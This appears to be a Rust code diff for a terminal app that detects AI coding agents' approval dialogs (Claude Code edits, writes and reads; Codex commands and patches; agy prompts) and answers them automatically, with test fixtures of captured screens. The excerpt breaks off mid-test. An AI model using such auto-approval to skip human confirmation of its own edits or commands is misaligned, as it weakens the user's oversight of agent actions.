@@ -49,6 +49,7 @@ pub enum AutoApproveSignature {
     ClaudeAskUserQuestion,
     ClaudeEnterConfirm,
     CodexCommand,
+    CodexEdit,
     AgyAskUserQuestion,
     AgyCommand,
     AgySubagentApproval,
@@ -79,7 +80,6 @@ struct Signature {
     kind: PromptKind,
     anchors: &'static [&'static str],
     yes_label: Option<&'static str>,
-    requires_marker: bool,
     bytes: &'static [u8],
     /// How long a prompt must stay on screen before the answer is sent. Codex
     /// drops an Enter that lands right after its approval modal's first paint
@@ -90,48 +90,48 @@ struct Signature {
 
 const CODEX_PROMPT_SETTLE: Duration = Duration::from_millis(300);
 
-// #TODO(agent): UNVERIFIED — the Claude anchors below come from synthetic
-// fixtures only; capture a real Claude Code permission dialog and either fix
-// them or move Claude approval to its `PermissionRequest` hook.
+// Claude Code dialogs (2.1.327, captured from a real pty): a full-width `─`
+// rule, the title (`Create file`, `Edit file`, …), the tool input, the
+// `Do you want to …?` question, the selected `❯ 1. Yes`, and the
+// `Esc to cancel · Tab to amend` footer as the last row on screen. The
+// anchors are the titles, lowercased; `claude_dialog_region` checks the rest.
 const SIGNATURES: &[Signature] = &[
     Signature {
         id: AutoApproveSignature::ClaudeEdit,
         agent: AgentKind::ClaudeCode,
         kind: PromptKind::Edit,
-        anchors: &["claude wants to edit"],
+        anchors: &["edit file"],
         yes_label: Some("1. Yes"),
-        requires_marker: true,
-        bytes: b"1\r",
+        bytes: b"\r",
         settle: Duration::ZERO,
     },
     Signature {
         id: AutoApproveSignature::ClaudeWrite,
         agent: AgentKind::ClaudeCode,
         kind: PromptKind::Write,
-        anchors: &["claude wants to write", "claude wants to create"],
+        anchors: &["create file", "overwrite file", "write file"],
         yes_label: Some("1. Yes"),
-        requires_marker: true,
-        bytes: b"1\r",
+        bytes: b"\r",
         settle: Duration::ZERO,
     },
     Signature {
         id: AutoApproveSignature::ClaudeRead,
         agent: AgentKind::ClaudeCode,
         kind: PromptKind::Read,
-        anchors: &["claude wants to read"],
+        anchors: &["read file"],
         yes_label: Some("1. Yes"),
-        requires_marker: true,
-        bytes: b"1\r",
+        bytes: b"\r",
         settle: Duration::ZERO,
     },
+    // The AskUserQuestion dialog has no fixed title: its header chip is
+    // `☐ <header>`, and `claude_question_menu` checks the menu around it.
     Signature {
         id: AutoApproveSignature::ClaudeAskUserQuestion,
         agent: AgentKind::ClaudeCode,
         kind: PromptKind::AskUserQuestion,
-        anchors: &["claude has a question", "claude asks"],
-        yes_label: Some("1."),
-        requires_marker: true,
-        bytes: b"1\r",
+        anchors: &[],
+        yes_label: Some("1. "),
+        bytes: b"\r",
         settle: Duration::ZERO,
     },
     Signature {
@@ -140,7 +140,6 @@ const SIGNATURES: &[Signature] = &[
         kind: PromptKind::EnterConfirm,
         anchors: &["press enter to continue"],
         yes_label: None,
-        requires_marker: false,
         bytes: b"\r",
         settle: Duration::ZERO,
     },
@@ -150,7 +149,18 @@ const SIGNATURES: &[Signature] = &[
         kind: PromptKind::Command,
         anchors: &["would you like to run the following command?"],
         yes_label: Some("1. Yes, proceed (y)"),
-        requires_marker: true,
+        bytes: b"\r",
+        settle: CODEX_PROMPT_SETTLE,
+    },
+    // Codex's patch approval (`ApplyPatch`, upstream snapshot
+    // `approval_modal_patch` at rust-v0.169.1): the modal names the files but
+    // shows no diff.
+    Signature {
+        id: AutoApproveSignature::CodexEdit,
+        agent: AgentKind::Codex,
+        kind: PromptKind::Edit,
+        anchors: &["would you like to make the following edits?"],
+        yes_label: Some("1. Yes, proceed (y)"),
         bytes: b"\r",
         settle: CODEX_PROMPT_SETTLE,
     },
@@ -160,7 +170,6 @@ const SIGNATURES: &[Signature] = &[
         kind: PromptKind::AskUserQuestion,
         anchors: &["question"],
         yes_label: Some("1. (Recommended) "),
-        requires_marker: true,
         bytes: b"\r",
         settle: Duration::ZERO,
     },
@@ -170,7 +179,6 @@ const SIGNATURES: &[Signature] = &[
         kind: PromptKind::Command,
         anchors: &["command"],
         yes_label: Some("1. Yes"),
-        requires_marker: true,
         bytes: b"\r",
         settle: Duration::ZERO,
     },
@@ -183,7 +191,6 @@ const SIGNATURES: &[Signature] = &[
         kind: PromptKind::Command,
         anchors: &[" needs approval for "],
         yes_label: None,
-        requires_marker: false,
         bytes: b"\x0b",
         settle: Duration::ZERO,
     },
@@ -220,6 +227,9 @@ pub(crate) struct DetectContext {
     pub(crate) alt_screen: bool,
     pub(crate) scrollback_offset: usize,
     pub(crate) guards: AutoApproveInputGuards,
+    /// The agent's latest status report says it waits on an approval or an
+    /// answer (`Terminal::agent_awaits_answer`).
+    pub(crate) agent_awaits_answer: bool,
 }
 
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
@@ -375,12 +385,12 @@ pub(crate) fn detect_and_update_any_agent(
                     | SuppressReason::PasteActive
                     | SuppressReason::ViewportNotLive
             )
-            .then(|| find_prompt(rows, cursor, None))
+            .then(|| find_prompt(rows, cursor, None, ctx.agent_awaits_answer))
             .flatten();
             (Decision::Suppressed(reason), matched)
         }
         None => {
-            let matched = find_prompt(rows, cursor, None);
+            let matched = find_prompt(rows, cursor, None, ctx.agent_awaits_answer);
             (decide(matched.as_ref(), ctx, state), matched)
         }
     };
@@ -397,7 +407,12 @@ pub(crate) fn rescan_signature(
     if suppression(ctx).is_some() {
         return None;
     }
-    find_signature(rows, cursor, signature(signature_id))
+    find_signature(
+        rows,
+        cursor,
+        signature(signature_id),
+        ctx.agent_awaits_answer,
+    )
 }
 
 /// `NOA_AUTO_APPROVE_TRACE=1`: log every tracked-prompt decision and every
@@ -457,7 +472,11 @@ fn detect_inner(
     if let Some(reason) = suppression(ctx) {
         return Decision::Suppressed(reason);
     }
-    decide(find_prompt(rows, cursor, agent).as_ref(), ctx, state)
+    decide(
+        find_prompt(rows, cursor, agent, ctx.agent_awaits_answer).as_ref(),
+        ctx,
+        state,
+    )
 }
 
 /// The unsuppressed decision for one observed viewport: `matched` is the
@@ -628,19 +647,34 @@ thread_local! {
     static PROMPT_SCANS: std::cell::Cell<usize> = const { std::cell::Cell::new(0) };
 }
 
-fn find_prompt(rows: &[RowText], cursor: Point, agent: Option<AgentKind>) -> Option<MatchedPrompt> {
+/// `awaits_answer`: the agent reported that it waits on an answer, so a
+/// dialog it draws above its own status rows is live (see
+/// [`menu_has_live_tail`]).
+fn find_prompt(
+    rows: &[RowText],
+    cursor: Point,
+    agent: Option<AgentKind>,
+    awaits_answer: bool,
+) -> Option<MatchedPrompt> {
     #[cfg(test)]
     PROMPT_SCANS.with(|scans| scans.set(scans.get() + 1));
     let lowercase_rows = lowercase_rows(rows);
     SIGNATURES
         .iter()
         .filter(|sig| agent.is_none_or(|agent| sig.agent == agent))
-        .find_map(|sig| find_signature_with_lowercase(rows, &lowercase_rows, cursor, sig))
+        .find_map(|sig| {
+            find_signature_with_lowercase(rows, &lowercase_rows, cursor, sig, awaits_answer)
+        })
 }
 
-fn find_signature(rows: &[RowText], cursor: Point, sig: &Signature) -> Option<MatchedPrompt> {
+fn find_signature(
+    rows: &[RowText],
+    cursor: Point,
+    sig: &Signature,
+    awaits_answer: bool,
+) -> Option<MatchedPrompt> {
     let lowercase_rows = lowercase_rows(rows);
-    find_signature_with_lowercase(rows, &lowercase_rows, cursor, sig)
+    find_signature_with_lowercase(rows, &lowercase_rows, cursor, sig, awaits_answer)
 }
 
 fn find_signature_with_lowercase(
@@ -648,6 +682,7 @@ fn find_signature_with_lowercase(
     lowercase_rows: &[RowText],
     cursor: Point,
     sig: &Signature,
+    awaits_answer: bool,
 ) -> Option<MatchedPrompt> {
     if rows.is_empty() || cursor.y as usize >= rows.len() {
         return None;
@@ -680,11 +715,12 @@ fn find_signature_with_lowercase(
     if matches!(
         sig.id,
         AutoApproveSignature::CodexCommand
+            | AutoApproveSignature::CodexEdit
             | AutoApproveSignature::AgyAskUserQuestion
             | AutoApproveSignature::AgyCommand
     ) {
         let region = menu_prompt_region(rows, lowercase_rows, sig)?;
-        if !menu_has_live_tail(rows, *region.end(), sig) {
+        if !menu_has_live_tail(rows, *region.end(), sig, awaits_answer) {
             return None;
         }
         // The choices below only echo the command ("… start with git add").
@@ -703,39 +739,26 @@ fn find_signature_with_lowercase(
         });
     }
 
-    let (anchor_index, option_index) = match sig.yes_label {
-        Some(label) => {
-            let option_index = cursor.y as usize;
-            if !affirmative_selected(&rows[option_index], label, sig.requires_marker) {
-                return None;
-            }
-            let anchor_index = claude_dialog_anchor(&lowercase_rows[..option_index], sig)?;
-            // The option must open the first menu below the title: another
-            // menu in between (a stale, already-answered dialog left on
-            // screen) means the cursor sits in a different, unknown dialog.
-            if rows[anchor_index + 1..option_index]
-                .iter()
-                .any(|row| starts_menu(row))
-            {
-                return None;
-            }
-            (anchor_index, option_index)
-        }
-        None => {
-            let anchor_index = lowercase_rows
-                .iter()
-                .position(|row| sig.anchors.iter().any(|anchor| row.contains(anchor)))?;
-            if cursor.y as usize != anchor_index {
-                return None;
-            }
-            (anchor_index, anchor_index)
-        }
-    };
+    if sig.agent == AgentKind::ClaudeCode && sig.yes_label.is_some() {
+        let region = claude_dialog_region(rows, lowercase_rows, sig)?;
+        return Some(MatchedPrompt {
+            signature: sig.id,
+            region_hash: region_hash(rows, region.clone()),
+            region,
+        });
+    }
 
+    // Enter-to-continue: the anchor row holds the cursor.
+    let anchor_index = lowercase_rows
+        .iter()
+        .position(|row| sig.anchors.iter().any(|anchor| row.contains(anchor)))?;
+    if cursor.y as usize != anchor_index {
+        return None;
+    }
     let end = rows
         .len()
         .saturating_sub(1)
-        .min(option_index.saturating_add(2));
+        .min(anchor_index.saturating_add(2));
     let region = anchor_index..=end;
     Some(MatchedPrompt {
         signature: sig.id,
@@ -758,50 +781,193 @@ fn denied(sig: &Signature, command_rows: &[RowText]) -> bool {
     true
 }
 
-/// Rows that open a Claude Code approval dialog. Bash approvals are listed so
-/// that their presence makes a screen ambiguous, never so they match.
-const CLAUDE_DIALOG_TITLES: &[&str] = &[
-    "claude wants to",
-    "claude has a question",
-    "claude asks",
-    "bash command",
-];
+const CLAUDE_PERMISSION_FOOTER: &str = "Esc to cancel · Tab to amend";
+const CLAUDE_QUESTION_FOOTER: &str = "Enter to select · ↑/↓ to navigate · Esc to cancel";
 
-/// The title row of the dialog whose selected option sits just below
-/// `above_option`, if that title is one of `sig`'s anchors. The title must
-/// begin its row, and it must be the only dialog title on screen above the
-/// option: anchor text quoted inside another dialog (a Bash command, tool
-/// output) adds a second title, and the screen is then left to the user.
-fn claude_dialog_anchor(above_option: &[RowText], sig: &Signature) -> Option<usize> {
-    let mut titles = above_option.iter().enumerate().filter(|(_, row)| {
-        let row = trim_dialog_border(row);
-        CLAUDE_DIALOG_TITLES
-            .iter()
-            .any(|title| row.starts_with(title))
-    });
-    let (index, title) = titles.next()?;
-    if titles.next().is_some() {
+/// `row` with runs of whitespace collapsed to one space and trimmed.
+fn squeeze(row: &str) -> String {
+    row.split_whitespace().collect::<Vec<_>>().join(" ")
+}
+
+/// A Claude Code dialog drawn as the last thing on screen: a `─` rule, the
+/// title row, the dialog body, the selected first choice and the footer,
+/// with nothing but blank rows below. Returns the title..=footer rows.
+///
+/// A permission dialog (Edit/Write/Read) must ask the question its title
+/// implies and offer only `Yes, …` choices before a final `No`; a Bash
+/// dialog, a safety check that lists `No` first, and any other title are
+/// left to the user.
+fn claude_dialog_region(
+    rows: &[RowText],
+    lowercase_rows: &[RowText],
+    sig: &Signature,
+) -> Option<RangeInclusive<usize>> {
+    let ask = sig.id == AutoApproveSignature::ClaudeAskUserQuestion;
+    let footer = rows.iter().rposition(|row| !row.trim().is_empty())?;
+    let expected_footer = if ask {
+        CLAUDE_QUESTION_FOOTER
+    } else {
+        CLAUDE_PERMISSION_FOOTER
+    };
+    if squeeze(&rows[footer]) != expected_footer {
         return None;
     }
-    let title = trim_dialog_border(title);
-    sig.anchors
-        .iter()
-        .any(|anchor| title.starts_with(anchor))
-        .then_some(index)
+    // The selected choice is the nearest one above the footer; the dialog
+    // opens at the rule above it (a question menu has a second rule below).
+    let option = (0..footer)
+        .rev()
+        .find(|&idx| selected_option(&rows[idx]).is_some())?;
+    // Claude Code pads everything inside a dialog (title, tool input, a Bash
+    // command's body), so only a rule from column 0 opens one.
+    let rule = (0..option)
+        .rev()
+        .find(|&idx| !rows[idx].starts_with(char::is_whitespace) && rule_row(&rows[idx]))?;
+    let title = (rule + 1..option).find(|&idx| !rows[idx].trim().is_empty())?;
+    if (title..footer).any(|idx| idx != option && selected_option(&rows[idx]).is_some()) {
+        return None;
+    }
+    // Nothing below the choice may open another dialog or menu: a picker
+    // with unnumbered choices (`❯ Haiku`) or a rule from column 0, except
+    // the question menu's own rule above its final `Chat about this`.
+    for idx in option + 1..footer {
+        let row = &rows[idx];
+        if row.trim_start().starts_with(['❯', '›']) {
+            return None;
+        }
+        if !row.starts_with(char::is_whitespace) && rule_row(row) {
+            let next = (idx + 1..footer).find(|&i| {
+                let below = &rows[i];
+                !below.trim().is_empty() && !rule_row(below)
+            });
+            let final_choice = ask
+                && next.is_some_and(|i| {
+                    numbered_choice(rows[i].trim())
+                        .is_some_and(|(_, text)| text == "Chat about this")
+                });
+            if !final_choice {
+                return None;
+            }
+        }
+    }
+    let label = selected_option(&rows[option]).expect("found as a selected choice");
+    let valid = if ask {
+        claude_question_menu(rows, title, label, option, footer)
+    } else {
+        label
+            == sig
+                .yes_label
+                .expect("Claude permission signatures name a choice")
+            && sig.anchors.contains(&lowercase_rows[title].trim())
+            && claude_permission_menu(rows, sig, title, option, footer)
+    };
+    valid.then_some(title..=footer)
 }
 
-/// A row that opens a numbered menu: its first choice, selected or not.
-fn starts_menu(row: &str) -> bool {
-    let row = trim_dialog_border(row);
-    let row = row
-        .strip_prefix('❯')
-        .or_else(|| row.strip_prefix('>'))
-        .unwrap_or(row);
-    row.trim_start().starts_with("1.")
+/// The question a permission dialog asks, which may wrap over several rows
+/// (`Do you want to make this edit to <long path>?`), must fit its title.
+fn claude_permission_menu(
+    rows: &[RowText],
+    sig: &Signature,
+    title: usize,
+    option: usize,
+    footer: usize,
+) -> bool {
+    let asks = |question: &str| {
+        let Some(question) = question
+            .strip_prefix("Do you want to ")
+            .and_then(|rest| rest.strip_suffix('?'))
+        else {
+            return false;
+        };
+        match sig.id {
+            AutoApproveSignature::ClaudeEdit => question.starts_with("make this edit to "),
+            AutoApproveSignature::ClaudeWrite => ["create ", "overwrite ", "write to "]
+                .iter()
+                .any(|verb| question.starts_with(verb)),
+            AutoApproveSignature::ClaudeRead => question == "proceed",
+            _ => false,
+        }
+    };
+    // The question ends right above the choice and may wrap over several
+    // rows, at a space or inside a word, so each run of rows is joined both
+    // ways.
+    let question_fits = (title + 1..option).rev().any(|start| {
+        let fragments: Vec<_> = rows[start..option].iter().map(|row| row.trim()).collect();
+        asks(&squeeze(&fragments.join(" "))) || asks(&fragments.concat())
+    });
+    if !question_fits {
+        return false;
+    }
+    let mut next = 2;
+    let mut saw_no = false;
+    for row in &rows[option + 1..footer] {
+        let row = row.trim();
+        if row.is_empty() {
+            continue;
+        }
+        match numbered_choice(row) {
+            Some((number, text)) => {
+                if saw_no || number != next {
+                    return false;
+                }
+                next += 1;
+                if text == "No" || text.starts_with("No, ") {
+                    saw_no = true;
+                } else if !text.starts_with("Yes, ") {
+                    return false;
+                }
+            }
+            // A wrapped tail of the previous choice.
+            None => {
+                if next == 2 {
+                    return false;
+                }
+            }
+        }
+    }
+    saw_no
 }
 
-fn trim_dialog_border(row: &str) -> &str {
-    row.trim_start_matches(|c: char| c.is_whitespace() || matches!(c, '│' | '╭' | '╰' | '─' | '|'))
+/// A single-question AskUserQuestion menu: one `☐ <header>` chip (several
+/// chips, or a `✔ Submit` tab, mean a multi-question form that Enter does
+/// not submit), a single-select first choice, and Claude Code's own
+/// `Type something.` and final `Chat about this` choices.
+fn claude_question_menu(
+    rows: &[RowText],
+    title: usize,
+    label: &str,
+    option: usize,
+    footer: usize,
+) -> bool {
+    let header = rows[title].trim();
+    let single_chip = header.starts_with("☐ ")
+        && header.matches('☐').count() == 1
+        && !header.contains(['✔', '☒', '←', '→']);
+    let first = label.strip_prefix("1. ").map(str::trim).unwrap_or_default();
+    if !single_chip || first.is_empty() || first.starts_with('[') {
+        return false;
+    }
+    let mut next = 2;
+    let mut last = "";
+    let mut type_something = false;
+    for row in &rows[option + 1..footer] {
+        if let Some((number, text)) = numbered_choice(row.trim()) {
+            if number != next {
+                return false;
+            }
+            next += 1;
+            type_something |= text == "Type something.";
+            last = text;
+        }
+    }
+    type_something && last == "Chat about this"
+}
+
+/// `N. text` with a positive `N`.
+fn numbered_choice(row: &str) -> Option<(u32, &str)> {
+    let (number, text) = row.split_once(". ")?;
+    let number = number.parse::<u32>().ok().filter(|&number| number > 0)?;
+    Some((number, text))
 }
 
 /// These TUIs select with a painted marker and can park the terminal cursor
@@ -833,13 +999,28 @@ fn match_menu_prompt_region(
     lowercase_rows: &[RowText],
     sig: &Signature,
 ) -> Option<RangeInclusive<usize>> {
-    let anchor = lowercase_rows.iter().rposition(|row| {
-        let row = row.trim();
-        sig.anchors.contains(&row)
-            || (sig.id == AutoApproveSignature::CodexCommand && codex_stdin_title(row))
-    })?;
+    // The lowest title row wins, but a row below the dialog can repeat a
+    // title (agy runs the user's status line script), so a candidate that
+    // opens no complete dialog yields to the next one up.
+    (0..rows.len())
+        .rev()
+        .filter(|&idx| {
+            let row = lowercase_rows[idx].trim();
+            sig.anchors.contains(&row)
+                || (sig.id == AutoApproveSignature::CodexCommand && codex_stdin_title(row))
+        })
+        .find_map(|anchor| match_menu_at(rows, sig, anchor))
+}
+
+fn match_menu_at(
+    rows: &[RowText],
+    sig: &Signature,
+    anchor: usize,
+) -> Option<RangeInclusive<usize>> {
     let footer_text = match sig.id {
-        AutoApproveSignature::CodexCommand => "Press enter to confirm or esc to cancel",
+        AutoApproveSignature::CodexCommand | AutoApproveSignature::CodexEdit => {
+            "Press enter to confirm or esc to cancel"
+        }
         AutoApproveSignature::AgyAskUserQuestion => "↑/↓ Navigate · enter Select · esc Skip",
         AutoApproveSignature::AgyCommand => "↑/↓ Navigate · tab Amend · ctrl+g edit/expand command",
         _ => return None,
@@ -858,7 +1039,7 @@ fn match_menu_prompt_region(
         } else {
             let text = rows[start].split_whitespace().collect::<Vec<_>>().join(" ");
             let matched = text == footer_text
-                || (sig.id == AutoApproveSignature::CodexCommand
+                || (sig.agent == AgentKind::Codex
                     && text
                         .strip_prefix(footer_text)
                         .is_some_and(|rest| rest == " or o to open thread"));
@@ -875,6 +1056,9 @@ fn match_menu_prompt_region(
     let valid = match sig.id {
         AutoApproveSignature::CodexCommand => {
             label == expected && codex_command_menu(rows, anchor, option, footer)
+        }
+        AutoApproveSignature::CodexEdit => {
+            label == expected && codex_edit_menu(rows, anchor, option, footer)
         }
         AutoApproveSignature::AgyAskUserQuestion => {
             label
@@ -906,15 +1090,37 @@ fn wrapped_footer_end(rows: &[RowText], start: usize, expected: &str) -> Option<
     None
 }
 
-fn menu_has_live_tail(rows: &[RowText], footer: usize, sig: &Signature) -> bool {
-    let mut tail = rows[footer + 1..]
+/// Only blank rows, or for agy its status rows, may follow a live dialog's
+/// footer. agy's status line is user-scriptable (several rows of any text),
+/// so beyond its stock one-row bar the dialog counts as live while agy
+/// itself reports (OSC 7501) that it waits on an answer and no row below the
+/// footer is a marked menu choice.
+fn menu_has_live_tail(
+    rows: &[RowText],
+    footer: usize,
+    sig: &Signature,
+    awaits_answer: bool,
+) -> bool {
+    let tail: Vec<_> = rows[footer + 1..]
         .iter()
         .map(|row| row.trim())
-        .filter(|row| !row.is_empty());
-    let Some(status) = tail.next() else {
-        return true;
-    };
-    sig.agent == AgentKind::Agy && agy_status_row(status) && tail.next().is_none()
+        .filter(|row| !row.is_empty())
+        .collect();
+    match tail.as_slice() {
+        [] => true,
+        _ if sig.agent != AgentKind::Agy => false,
+        [status] if agy_status_row(status) => true,
+        _ => awaits_answer && tail.iter().all(|row| !marked_choice(row)),
+    }
+}
+
+/// A row that a selection marker opens with text after it: a menu choice,
+/// numbered (`> 1. Yes`) or not (`❯ Haiku`). A bare `>` is agy's input
+/// prompt, not a choice.
+fn marked_choice(row: &str) -> bool {
+    row.trim_start()
+        .strip_prefix(['❯', '›', '>'])
+        .is_some_and(|rest| rest.starts_with(char::is_whitespace) && !rest.trim().is_empty())
 }
 
 /// agy's one-row status bar under a dialog: `[Model] Cost: $0.0000`, or a
@@ -1090,6 +1296,36 @@ fn codex_command_menu(rows: &[RowText], anchor: usize, option: usize, footer: us
             && remember.ends_with("(p)"))
 }
 
+/// The patch modal: a `Destination:` row (and `Description:`, `Reason:`,
+/// `Thread:` rows), then `Yes, proceed`, the optional per-file remember
+/// choice, and the rejection.
+fn codex_edit_menu(rows: &[RowText], anchor: usize, option: usize, footer: usize) -> bool {
+    // A long path wraps whole onto the next row, leaving `Destination:`.
+    let has_destination = (anchor + 1..option).any(|idx| {
+        let row = rows[idx].trim();
+        row.strip_prefix("Destination: ")
+            .is_some_and(|dest| !dest.trim().is_empty())
+            || (row == "Destination:" && idx + 1 < option && !rows[idx + 1].trim().is_empty())
+    });
+    // A physical row can end inside a word or shortcut, so match each
+    // fragment against the remaining choices without inserting spaces.
+    const CHOICES: [&str; 2] = [
+        "2. No, and tell Codex what to do differently (esc)",
+        "2. Yes, and don't ask again for these files (a)3. No, and tell Codex what to do differently (esc)",
+    ];
+    let fragments: Vec<_> = rows[option + 1..footer]
+        .iter()
+        .map(|row| row.trim())
+        .filter(|row| !row.is_empty())
+        .collect();
+    has_destination
+        && CHOICES.iter().any(|expected| {
+            fragments.iter().try_fold(*expected, |remaining, row| {
+                remaining.trim_start().strip_prefix(*row)
+            }) == Some("")
+        })
+}
+
 fn agy_question_menu(rows: &[RowText], anchor: usize, option: usize, footer: usize) -> bool {
     let has_question = rows[anchor + 1..option].iter().any(|row| {
         let Some((counter, question)) = row
@@ -1203,26 +1439,10 @@ fn selected_option(row: &str) -> Option<&str> {
     let label = row
         .trim_start()
         .strip_prefix(['❯', '›', '>'])
-        .map(str::trim_start)?;
+        .map(str::trim)?;
     // Command text and wrapped choice details can begin with shell redirections.
     let (number, _) = label.split_once(". ")?;
     (!number.is_empty() && number.bytes().all(|ch| ch.is_ascii_digit())).then_some(label)
-}
-
-fn affirmative_selected(row: &str, yes_label: &str, requires_marker: bool) -> bool {
-    let trimmed = row.trim_start();
-    let selected = trimmed
-        .strip_prefix('❯')
-        .or_else(|| trimmed.strip_prefix('>'));
-    let candidate = if requires_marker {
-        let Some(rest) = selected else {
-            return false;
-        };
-        rest.trim_start()
-    } else {
-        selected.unwrap_or(trimmed).trim_start()
-    };
-    candidate.starts_with(yes_label)
 }
 
 fn count_recent_approvals(approvals: &VecDeque<Instant>, now: Instant) -> usize {
@@ -1263,6 +1483,7 @@ mod tests {
             alt_screen: true,
             scrollback_offset: 0,
             guards: AutoApproveInputGuards::default(),
+            agent_awaits_answer: false,
         }
     }
 
@@ -1279,12 +1500,94 @@ mod tests {
         Point { x: 0, y: row }
     }
 
+    const CLAUDE_RULE: &str = "────────────────────────────────────────";
+    const CLAUDE_DIFF_RULE: &str = "╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌";
+
+    /// Claude Code 2.1.327's Edit dialog as captured from a real pty
+    /// (fullscreen renderer, 120 columns), for `file`.
+    fn claude_edit_prompt_for(file: &str) -> Vec<RowText> {
+        let mut screen = rows(&["⏺ Update(hello.txt)", "", CLAUDE_RULE, " Edit file"]);
+        screen.push(format!(" {file}"));
+        screen.extend(rows(&[
+            CLAUDE_DIFF_RULE,
+            " 1 -hi",
+            " 1 +hello",
+            CLAUDE_DIFF_RULE,
+        ]));
+        screen.push(format!(" Do you want to make this edit to {file}?"));
+        screen.extend(rows(&[
+            " ❯ 1. Yes",
+            "   2. Yes, and switch to accept edits (auto-approve file edits and common file commands) for this session (shift+tab)",
+            "   3. No",
+            "",
+            " Esc to cancel · Tab to amend",
+            "",
+            "",
+        ]));
+        screen
+    }
+
     fn claude_edit_prompt() -> Vec<RowText> {
+        claude_edit_prompt_for("hello.txt")
+    }
+
+    /// Claude Code 2.1.327's Write dialog for a new file (real capture).
+    fn claude_create_prompt() -> Vec<RowText> {
         rows(&[
-            "Claude wants to edit crates/noa-app/src/lib.rs",
-            "❯ 1. Yes",
-            "  2. No, tell Claude what to do differently",
+            "⏺ Write(hello.txt)",
+            "",
+            CLAUDE_RULE,
+            " Create file",
+            " hello.txt",
+            CLAUDE_DIFF_RULE,
+            "  1 hi",
+            CLAUDE_DIFF_RULE,
+            " Do you want to create hello.txt?",
+            " ❯ 1. Yes",
+            "   2. Yes, and switch to accept edits (auto-approve file edits and common file commands) for this session (shift+tab)",
+            "   3. No",
+            "",
+            " Esc to cancel · Tab to amend",
+            "",
         ])
+    }
+
+    /// Claude Code 2.1.327's single-question AskUserQuestion dialog (real
+    /// capture).
+    fn claude_question_prompt() -> Vec<RowText> {
+        rows(&[
+            "❯ Use the AskUserQuestion tool to ask me whether I prefer red or blue.",
+            CLAUDE_RULE,
+            " ☐ Color",
+            "",
+            "red と blue のどちらが好みですか？",
+            "",
+            "❯ 1. Red",
+            "     赤",
+            "  2. Blue",
+            "     青",
+            "  3. Type something.",
+            CLAUDE_RULE,
+            "  4. Chat about this",
+            "",
+            "Enter to select · ↑/↓ to navigate · Esc to cancel",
+        ])
+    }
+
+    /// Claude Code's Bash dialog, which auto-approve never answers.
+    fn claude_bash_prompt(command: &str) -> Vec<RowText> {
+        let mut screen = rows(&[CLAUDE_RULE, " Bash command", ""]);
+        screen.push(format!("   {command}"));
+        screen.extend(rows(&[
+            "",
+            " Do you want to proceed?",
+            " ❯ 1. Yes",
+            "   2. Yes, and don't ask again for ls commands in /tmp",
+            "   3. No",
+            "",
+            " Esc to cancel · Tab to amend",
+        ]));
+        screen
     }
 
     fn prompt_scans() -> usize {
@@ -1297,11 +1600,7 @@ mod tests {
     fn detect_and_update_scans_viewport_once_per_feed() {
         let now = Instant::now();
         let mut state = AutoApproveState::default();
-        let prompt = rows(&[
-            "Claude wants to edit crates/noa-app/src/lib.rs",
-            "❯ 1. Yes",
-            "  2. No",
-        ]);
+        let prompt = claude_edit_prompt();
         let plain = rows(&["plain output", "no prompt here"]);
 
         let before = prompt_scans();
@@ -2737,68 +3036,397 @@ mod tests {
     }
 
     #[test]
-    fn claude_anchor_quoted_inside_a_bash_approval_does_not_match() {
-        for fixture in [
-            rows(&[
-                "Bash command",
-                "  echo done # Claude wants to edit crates/noa-app/src/lib.rs",
-                "Claude wants to edit crates/noa-app/src/lib.rs",
-                "Do you want to proceed?",
-                "❯ 1. Yes",
-                "  2. No",
-            ]),
-            rows(&[
-                "Claude wants to edit crates/noa-app/src/lib.rs",
-                "Claude wants to use Bash",
-                "❯ 1. Yes",
-                "  2. No",
-            ]),
+    fn claude_permission_dialogs_match_their_signature() {
+        for (screen, id) in [
+            (claude_edit_prompt(), AutoApproveSignature::ClaudeEdit),
+            (claude_create_prompt(), AutoApproveSignature::ClaudeWrite),
+            (
+                claude_question_prompt(),
+                AutoApproveSignature::ClaudeAskUserQuestion,
+            ),
         ] {
-            let option_row = fixture.iter().position(|row| row.starts_with('❯')).unwrap();
-            assert_eq!(
-                find_signature(
-                    &fixture,
-                    cursor(option_row as u16),
-                    signature(AutoApproveSignature::ClaudeEdit)
-                ),
-                None
+            let matched = find_prompt(&screen, cursor(0), Some(AgentKind::ClaudeCode), false)
+                .unwrap_or_else(|| panic!("{id:?} should match"));
+            assert_eq!(matched.signature, id);
+            assert!(
+                screen[*matched.region.start()]
+                    .trim_start()
+                    .starts_with(['E', 'C', '☐'])
             );
         }
+    }
+
+    #[test]
+    fn claude_edit_question_may_wrap() {
+        let mut screen = claude_edit_prompt();
+        let question = screen
+            .iter()
+            .position(|row| row.contains("Do you want to make this edit"))
+            .unwrap();
+        screen[question] = " Do you want to make this edit to".to_string();
+        screen.insert(question + 1, " crates/noa-app/src/lib.rs?".to_string());
         assert!(
             find_signature(
-                &claude_edit_prompt(),
-                cursor(1),
-                signature(AutoApproveSignature::ClaudeEdit)
+                &screen,
+                cursor(0),
+                signature(AutoApproveSignature::ClaudeEdit),
+                false
             )
             .is_some()
         );
     }
 
     #[test]
-    fn stale_claude_title_does_not_claim_an_unknown_menu_below_it() {
-        let now = fixed_now();
-        let mut state = AutoApproveState::default();
-        let screen = rows(&[
-            "Claude wants to edit crates/noa-app/src/lib.rs",
-            "❯ 1. Yes",
-            "  2. No",
-            "Allow tool execution?",
-            "❯ 1. Yes",
-            "  2. No",
-        ]);
+    fn claude_bash_and_mismatched_dialogs_do_not_match() {
+        let edit = signature(AutoApproveSignature::ClaudeEdit);
+        let write = signature(AutoApproveSignature::ClaudeWrite);
+        // Bash approvals are never answered, even when the command quotes a
+        // file dialog's title.
         assert_eq!(
-            find_signature(
-                &screen,
-                cursor(4),
-                signature(AutoApproveSignature::ClaudeEdit)
+            find_prompt(
+                &claude_bash_prompt("echo Edit file"),
+                cursor(0),
+                None,
+                false
             ),
             None
         );
-        for _ in 0..2 {
-            assert!(!matches!(
-                detect_and_update_any_agent(&screen, cursor(4), base_ctx(now), &mut state),
-                Decision::Fire { .. }
-            ));
+        // The title and the question must agree.
+        let mut swapped = claude_create_prompt();
+        swapped[3] = " Edit file".to_string();
+        assert_eq!(find_signature(&swapped, cursor(0), edit, false), None);
+        assert_eq!(find_signature(&swapped, cursor(0), write, false), None);
+        // A safety check offers `No` first; anything but `Yes, …` before the
+        // final `No` is an unknown choice.
+        for (from, to) in [
